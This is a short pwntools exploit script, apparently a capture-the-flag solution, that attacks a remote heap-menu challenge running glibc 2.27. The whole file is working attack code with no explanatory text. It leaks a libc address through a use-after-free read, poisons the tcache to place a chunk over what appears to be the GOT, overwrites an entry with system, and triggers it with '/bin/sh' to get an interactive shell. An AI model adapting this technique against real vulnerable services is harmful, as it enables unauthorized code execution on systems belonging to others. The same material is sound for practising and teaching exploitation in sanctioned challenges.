from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./task',env={"LD_PRELOAD":"./libc-2.27.so"})
p = remote("0.cloud.chals.io",29394)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b">> ",str(c).encode())
def add(size):
    cmd(1)
    sla(b":\n",str(size).encode())
def show(idx):
    cmd(4)
    sla(b":\n",str(idx).encode())
def edit(idx,c=b'1'):
    cmd(2)
    sla(b":\n",str(idx).encode())
    sa(b':\n',c)
def free(idx):
    cmd(3)
    sla(b":\n",str(idx).encode())

add(0x418)
add(0x18)
edit(0,"n132")
free(0)
show(0)
ru(": ")
base = u64(p.readline()[:-1].ljust(0x8,'\0'))-(0x7ffff7dcdca0-0x7ffff79e2000)-(0x7ffff79e2000-0x00007ffff79e2000)
info(hex(base))
add(0x18)
free(1)
free(2)
edit(2,p64(0x0000000000602010))
add(0x18)#3
libc = ELF("./libc-2.27.so")
libc.address =base
add(0x18)#4
edit(4,p64(0)+p64(libc.sym['system']))
edit(3,"/bin/sh\0")
# gdb.attach(p)
free(3)

p.interactive()